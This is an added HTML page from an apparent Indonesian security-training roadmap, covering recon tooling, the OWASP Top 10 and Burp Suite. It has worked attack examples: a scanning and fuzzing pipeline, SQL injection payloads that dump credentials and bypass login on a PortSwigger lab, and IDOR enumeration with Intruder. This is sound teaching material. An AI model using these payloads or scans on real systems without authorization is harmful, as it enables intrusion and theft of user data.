@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Fase 2 — Offensive Fundamentals | Pixel Detective Academy</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+</head>
+<body class="page-phase">
+
+  <nav class="toc">
+    <div class="toc-inner">
+      <span class="toc-title">// FASE 2</span>
+      <a href="index.html">🏠 Home</a>
+      <a href="fase1.html">1</a>
+      <a href="fase2.html" class="active">2</a>
+      <a href="fase3.html">3</a>
+      <a href="fase4.html">4</a>
+      <a href="fase5.html">5</a>
+      <a href="fase6.html">6</a>
+      <button id="printBtn" class="btn-print">🖨️ PDF</button>
+    </div>
+    <div class="progress-bar" id="progressBar"></div>
+  </nav>
+
+  <main class="container">
+
+    <header class="phase-hero reveal">
+      <div class="phase-num-big">02</div>
+      <div class="badge">FASE 2 • OFFENSIVE FUNDAMENTALS</div>
+      <h1>Offensive Fundamentals</h1>
+      <p class="tagline">"Recon adalah 80% pekerjaan detektif. Eksploitasi hanyalah 20% sisanya."</p>
+      <p class="phase-duration">⏱️ 2–3 Bulan • 🎯 Target: 80% lab PortSwigger Apprentice + recon pipeline manual</p>
+      <button class="mark-done-btn" data-phase="2">✓ Tandai Fase Ini Selesai</button>
+    </header>
+
+    <section class="reveal">
+      <h2>🎯 Filosofi Fase Ini</h2>
+      <p>
+        Di fase ini kamu mulai <strong>berpikir seperti penyerang</strong> — tapi tetap dengan
+        mentalitas detektif: <em>pahami "kenapa" sebelum "bagaimana"</em>. Jangan hanya hafal
+        payload; pahami mengapa payload itu bekerja.
+      </p>
+      <div class="callout">
+        <strong>Prinsip Pixel Detective:</strong> Recon mendalam &gt; eksploitasi cepat.
+        Semakin banyak "pixel" yang kamu periksa, semakin besar peluang menemukan celah yang
+        orang lain lewatkan.
+      </div>
+    </section>
+
+    <section class="reveal">
+      <h2>🔍 2.1 Recon & OSINT — Seni Melihat</h2>
+      <p class="section-sub">Recon adalah fondasi semua serangan. Tanpa recon, kamu menembak dalam gelap.</p>
+
+      <h3>Step-by-Step:</h3>
+      <ol class="steps-list">
+        <li><strong>Passive Recon</strong> — Kumpulkan informasi tanpa menyentuh target: WHOIS, DNS records, Google dorking, Shodan, Wayback Machine, GitHub search, LinkedIn.</li>
+        <li><strong>Subdomain Enumeration</strong> — <code>subfinder</code>, <code>amass</code>, <code>assetfinder</code>, certificate transparency (<code>crt.sh</code>).</li>
+        <li><strong>Live Host Probing</strong> — <code>httpx</code>, <code>httprobe</code> untuk filter subdomain yang benar-benar hidup.</li>
+        <li><strong>Directory & File Discovery</strong> — <code>ffuf</code>, <code>dirsearch</code>, <code>gobuster</code> dengan wordlist yang tepat (SecLists).</li>
+        <li><strong>Technology Fingerprinting</strong> — <code>whatweb</code>, <code>wappalyzer</code>, header analysis, favicon hash.</li>
+        <li><strong>JavaScript Analysis</strong> — Ekstrak endpoint tersembunyi dari file JS (sering jadi "pixel" yang terlewat).</li>
+        <li><strong>Screenshot & Monitoring</strong> — <code>gowitness</code>, <code>aquatone</code> untuk visual recon; diff monitoring untuk perubahan.</li>
+      </ol>
+
+      <div class="example-box">
+        <h4>💡 Contoh Kompleks: Recon Pipeline Lengkap (Bash)</h4>
+        <pre><code>#!/bin/bash
+# pixel-recon.sh — Pipeline recon ala Pixel Detective
+# Usage: ./pixel-recon.sh target.com
+
+DOMAIN="${1:?Usage: $0 <domain>}"
+OUT="recon-${DOMAIN}-$(date +%Y%m%d-%H%M%S)"
+mkdir -p "$OUT"/{subs,live,dirs,js,screenshots,vulns}
+
+echo "=========================================="
+echo "  PIXEL DETECTIVE — Recon Pipeline"
+echo "  Target: $DOMAIN"
+echo "  Output: $OUT"
+echo "=========================================="
+
+# ── STEP 1: Subdomain Enumeration ──
+echo -e "\n[1/6] Subdomain enumeration..."
+subfinder -d "$DOMAIN" -all -silent -o "$OUT/subs/subfinder.txt" 2>/dev/null
+assetfinder --subs-only "$DOMAIN" > "$OUT/subs/assetfinder.txt" 2>/dev/null
+# Certificate Transparency
+curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" \
+  | jq -r '.[].name_value' 2>/dev/null \
+  | sed 's/\*\.//g' | sort -u > "$OUT/subs/crtsh.txt"
+
+cat "$OUT"/subs/*.txt | sort -u > "$OUT/subs/all.txt"
+echo "  → Total subdomain unik: $(wc -l < "$OUT/subs/all.txt")"
+
+# ── STEP 2: Probe Live Hosts ──
+echo -e "\n[2/6] Probing live hosts..."
+cat "$OUT/subs/all.txt" \
+  | httpx -silent -mc 200,301,302,403 \
+    -o "$OUT/live/live.txt" 2>/dev/null
+echo "  → Host hidup: $(wc -l < "$OUT/live/live.txt")"
+
+# ── STEP 3: Technology Fingerprinting ──
+echo -e "\n[3/6] Technology fingerprinting..."
+whatweb -i "$OUT/live/live.txt" --log-brief="$OUT/live/tech.txt" 2>/dev/null
+echo "  → Fingerprint tersimpan"
+
+# ── STEP 4: Directory Busting (parallel) ──
+echo -e "\n[4/6] Directory busting (ini butuh waktu)..."
+while IFS= read -r url; do
+  hostname=$(echo "$url" | sed 's|https\?://||; s|/.*||')
+  ffuf -u "${url}/FUZZ" \
+    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+    -mc 200,301,302,403 -t 50 -s \
+    -o "$OUT/dirs/${hostname}.json" -of json 2>/dev/null
+done < "$OUT/live/live.txt"
+echo "  → Directory scan selesai"
+
+# ── STEP 5: JavaScript Endpoint Extraction ──
+echo -e "\n[5/6] Ekstraksi endpoint dari JavaScript..."
+while IFS= read -r url; do
+  # Ambil semua file .js dari halaman
+  curl -s "$url" \
+    | grep -oE 'src="[^"]+\.js[^"]*"' \
+    | sed 's/src="//; s/"$//' \
+    | while IFS= read -r js; do
+        # Resolve relative URL
+        [[ "$js" != http* ]] && js=$(echo "$url" | sed 's|\(https\?://[^/]*\).*|\1|')/"$js"
+        curl -s "$js" \
+          | grep -oE '["'\''](/api/[a-zA-Z0-9_/.-]+)["'\'']' \
+          | tr -d '"'\''' | sort -u
+      done
+done < "$OUT/live/live.txt" | sort -u > "$OUT/js/endpoints.txt"
+echo "  → Endpoint JS ditemukan: $(wc -l < "$OUT/js/endpoints.txt")"
+
+# ── STEP 6: Vulnerability Scan ──
+echo -e "\n[6/6] Vulnerability scan dengan nuclei..."
+nuclei -l "$OUT/live/live.txt" \
+  -severity low,medium,high,critical \
+  -o "$OUT/vulns/nuclei.txt" 2>/dev/null
+echo "  → Potensi vuln: $(wc -l < "$OUT/vulns/nuclei.txt" 2>/dev/null || echo 0)"
+
+echo -e "\n=========================================="
+echo "  [✓] Recon selesai!"
+echo "  Hasil di: $OUT"
+echo "=========================================="</code></pre>
+        <p class="code-note">
+          <strong>Penjelasan:</strong> Pipeline ini menggabungkan 6 tool populer menjadi satu alur.
+          Setiap step menghasilkan output terstruktur di folder terpisah — memudahkan review manual.
+          Perhatikan <code>jq</code> untuk parsing JSON, dan <code>sed</code> untuk transformasi teks.
+        </p>
+      </div>
+
+      <div class="target-box">
+        <strong>🎯 Target 2.1:</strong> Bisa menjalankan recon pipeline lengkap pada domain legal
+        (misal: domain lab HTB/TryHackMe) dan menjelaskan setiap step.
+      </div>
+    </section>
+
+    <section class="reveal">
+      <h2>🕸️ 2.2 OWASP Top 10 — Peta Celah Web</h2>
+      <p class="section-sub">OWASP Top 10 adalah daftar risiko keamanan web paling umum. Wajib hafal dan paham.</p>
+
+      <h3>Step-by-Step:</h3>
+      <ol class="steps-list">
+        <li><strong>A01: Broken Access Control</strong> — IDOR, missing function-level access control, path traversal. Paling sering ditemukan di bug bounty.</li>
+        <li><strong>A02: Cryptographic Failures</strong> — Data sensitif tidak terenkripsi, weak hash, hardcoded secret.</li>
+        <li><strong>A03: Injection</strong> — SQLi, NoSQLi, OS Command Injection, LDAP Injection. Pahami perbedaan context.</li>
+        <li><strong>A04: Insecure Design</strong> — Logic flaw, race condition, business logic bypass.</li>
+        <li><strong>A05: Security Misconfiguration</strong> — Default credential, verbose error, directory listing, CORS misconfig.</li>
+        <li><strong>A06: Vulnerable Components</strong> — Library usang dengan CVE dikenal.</li>
+        <li><strong>A07: Identification & Auth Failures</strong> — Weak password policy, session fixation, JWT misconfig.</li>
+        <li><strong>A08: Software & Data Integrity Failures</strong> — Insecure deserialization, supply chain.</li>
+        <li><strong>A09: Logging & Monitoring Failures</strong> — Tidak ada deteksi serangan.</li>
+        <li><strong>A10: SSRF</strong> — Server-Side Request Forgery, sering jadi pivot ke internal network.</li>
+      </ol>
+
+      <div class="example-box">
+        <h4>💡 Contoh Kompleks: Deteksi & Eksploitasi SQL Injection (Lab Legal)</h4>
+        <pre><code># ============================================
+# TARGET: PortSwigger Web Security Academy
+# (lab legal — https://portswigger.net/web-security/sql-injection)
+# ============================================
+
+# ── STEP 1: Identifikasi titik injeksi ──
+# Parameter yang mencurigakan: ?category=Gifts
+# Uji dengan payload dasar:
+GET /filter?category=Gifts' HTTP/1.1
+Host: lab-id.web-security-academy.net
+
+# Jika muncul error SQL → injection point confirmed
+
+# ── STEP 2: Tentukan jumlah kolom (UNION-based) ──
+GET /filter?category=Gifts' ORDER BY 1-- HTTP/1.1   # OK
+GET /filter?category=Gifts' ORDER BY 2-- HTTP/1.1   # OK
+GET /filter?category=Gifts' ORDER BY 3-- HTTP/1.1   # ERROR → 2 kolom
+
+# ── STEP 3: Cari kolom yang menampilkan output ──
+GET /filter?category=Gifts' UNION SELECT 'a','b'-- HTTP/1.1
+# Jika 'a' atau 'b' muncul di response → kolom tersebut visible
+
+# ── STEP 4: Ekstrak data dari database ──
+GET /filter?category=Gifts' UNION SELECT username,password FROM users-- HTTP/1.1
+
+# ── STEP 5: Jika hanya 1 kolom visible, konkatenasi ──
+GET /filter?category=Gifts' UNION SELECT username||':'||password FROM users-- HTTP/1.1
+# (PostgreSQL: ||, MySQL: CONCAT(), MSSQL: +)
+
+# ── STEP 6: Bypass login (authentication bypass) ──
+POST /login HTTP/1.1
+Host: lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+
+username=administrator'--&password=anything
+
+# Penjelasan: query jadi SELECT * FROM users WHERE username='administrator'--' AND password='...'
+# Bagian setelah -- dikomentari → login sukses tanpa password</code></pre>
+        <p class="code-note">
+          <strong>Penjelasan:</strong> Ini adalah metodologi SQLi klasik:
+          <br>1. <strong>Detect</strong> — cari error/anomali
+          <br>2. <strong>Column count</strong> — ORDER BY / UNION SELECT NULL
+          <br>3. <strong>Data extraction</strong> — UNION SELECT
+          <br>4. <strong>Exploit</strong> — bypass auth / dump data
+          <br>Selalu praktik di lab legal seperti PortSwigger Academy.
+        </p>
+      </div>
+
+      <div class="target-box">
+        <strong>🎯 Target 2.2:</strong> Menyelesaikan minimal 20 lab PortSwigger Apprentice level
+        (SQLi, XSS, CSRF, IDOR, SSRF) dan bisa menjelaskan akar penyebabnya.
+      </div>
+    </section>
+
+    <section class="reveal">
+      <h2>🔧 2.3 Burp Suite — Senjata Utama Detektif</h2>
+      <p class="section-sub">Burp Suite adalah proxy intercept #1 untuk web pentest. Wajib kuasai manual, bukan hanya scanner.</p>
+
+      <h3>Step-by-Step:</h3>
+      <ol class="steps-list">
+        <li><strong>Setup Proxy</strong> — Konfigurasi browser → Burp proxy (127.0.0.1:8080), install CA certificate.</li>
+        <li><strong>Proxy & Intercept</strong> — Tangkap request, modifikasi, forward/drop. Pahami HTTP history.</li>
+        <li><strong>Repeater</strong> — Kirim request berulang, modifikasi manual, analisis response. Ini "meja kerja" detektif.</li>
+        <li><strong>Intruder</strong> — Brute force, fuzzing, enumeration. 4 attack type: Sniper, Battering Ram, Pitchfork, Cluster Bomb.</li>
+        <li><strong>Decoder & Comparer</strong> — Encode/decode (URL, base64, hex), bandingkan response.</li>
+        <li><strong>Scanner (Pro)</strong> — Automated scan, tapi <em>jangan bergantung</em> — manual testing tetap utama.</li>
+        <li><strong>Extensions</strong> — BApp Store: Autorize, JWT Editor, Turbo Intruder, Param Miner.</li>
+      </ol>
+
+      <div class="example-box">
+        <h4>💡 Contoh Kompleks: IDOR Enumeration dengan Burp Intruder</h4>
+        <pre><code># Skenario: Aplikasi punya endpoint /api/user/{id}/profile
+# Kita sudah login sebagai user id=1001, coba akses id lain.
+
+# ── STEP 1: Tangkap request di Proxy ──
+GET /api/user/1001/profile HTTP/1.1
+Host: target.com
+Authorization: Bearer eyJhbGciOi...
+
+# ── STEP 2: Kirim ke Intruder (Ctrl+I) ──
+# Posisi payload: /api/user/§1001§/profile
+
+# ── STEP 3: Konfigurasi payload ──
+# Payload type: Numbers
+# From: 1000, To: 1100, Step: 1
+# (Atau gunakan wordlist user id dari recon)
+
+# ── STEP 4: Attack type: Sniper ──
+# Start attack → perhatikan:
+#   - Status code (200 = akses berhasil)
+#   - Length response (berbeda = data user lain)
+#   - Grep - Match: "email" atau "phone" di response
+
+# ── STEP 5: Analisis hasil ──
+# Request dengan status 200 + length berbeda = IDOR confirmed
+# Contoh hasil:
+#   id=1001 → 200, length 1523 (user kita)
+#   id=1002 → 200, length 1487 (user lain — IDOR!)
+#   id=1003 → 403, length 89   (properly protected)
+
+# ── STEP 6: Dokumentasi ──
+# Screenshot request/response, catat:
+#   - Endpoint: GET /api/user/{id}/profile
+#   - Impact: Unauthorized access ke data user lain (PII leak)
+#   - Severity: High (jika PII) / Medium (jika non-sensitive)</code></pre>
+        <p class="code-note">
+          <strong>Penjelasan:</strong> IDOR (Insecure Direct Object Reference) adalah salah satu
+          bug paling umum di bug bounty. Kuncinya: <em>ganti identifier</em> dan lihat apakah
+          akses masih diberikan. Burp Intruder mengotomatiskan enumerasi.
+        </p>
+      </div>
+
+      <div class="target-box">
+        <strong>🎯 Target 2.3:</strong> Bisa menggunakan Burp Repeater & Intruder untuk manual
+        testing tanpa bergantung pada scanner otomatis.
+      </div>
+    </section>
+
+    <section class="reveal">
+      <h2>✅ Checklist Fase 2</h2>
+      <div class="checklist">
+        <label><input type="checkbox" data-check="2-1"> Paham passive vs active recon</label>
+        <label><input type="checkbox" data-check="2-2"> Bisa jalankan recon pipeline lengkap</label>
+        <label><input type="checkbox" data-check="2-3"> Paham 10 kategori OWASP Top 10</label>
+        <label><input type="checkbox" data-check="2-4"> Menyelesaikan 20+ lab PortSwigger Apprentice</label>
+        <label><input type="checkbox" data-check="2-5"> Kuasai Burp Proxy, Repeater, Intruder</label>
+        <label><input type="checkbox" data-check="2-6"> Bisa identifikasi SQLi, XSS, IDOR manual</label>
+        <label><input type="checkbox" data-check="2-7"> Paham cara ekstrak endpoint dari JavaScript</label>
+        <label><input type="checkbox" data-check="2-8"> Menyelesaikan 5+ mesin Easy di HackTheBox</label>
+        <label><input type="checkbox" data-check="2-9"> Bisa menulis vulnerability report sederhana</label>
+        <label><input type="checkbox" data-check="2-10"> Paham legalitas & scope bug bounty</label>
+      </div>
+    </section>
+
+    <nav class="phase-nav">
+      <a href="fase1.html" class="phase-nav-prev">← Fase 1: Fondasi</a>
+      <a href="fase3.html" class="phase-nav-next">Fase 3: Sertifikasi & Lab →</a>
+    </nav>
+
+  </main>
+
+  <footer class="footer">
+    <p><strong>PIXEL DETECTIVE ACADEMY</strong> — Fase 2</p>
+    <p class="footer-tagline">"Zoom in. Find the flaw. Own the pixel."</p>
+  </footer>
+
+  <script src="app.js"></script>
+</body>
+</html>
